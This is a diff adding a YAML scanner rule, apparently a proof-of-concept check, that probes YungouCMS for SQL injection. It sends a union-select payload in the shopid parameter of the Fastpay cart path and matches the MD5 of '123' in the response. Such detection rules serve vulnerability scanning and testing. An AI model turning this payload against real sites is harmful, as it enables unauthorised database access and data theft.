@@ -1,0 +1,14 @@
+name: poc-yaml-yungoucms-in-sqlinjection
+rules:
+  - method: GET
+    path: '/?/member/cart/Fastpay&shopid=-1%20union%20select%20md5(123),2,3,4%20--+'
+    headers:
+      User-Agent: >-
+        Mozilla/5.0(Windows;U;WindowsNT6.1;en-us)AppleWebKit/534.50(KHTML,likeGecko)Version/5.1Safari/534.50
+    follow_redirects: false
+    expression: |
+      status==200 && body.bcontains(b'202cb962ac59075b964b07152d234b70')
+detail:
+  author: cc_ci(https://github.com/cc8ci)
+  links:
+    - https://www.secquan.org/Prime/1069179
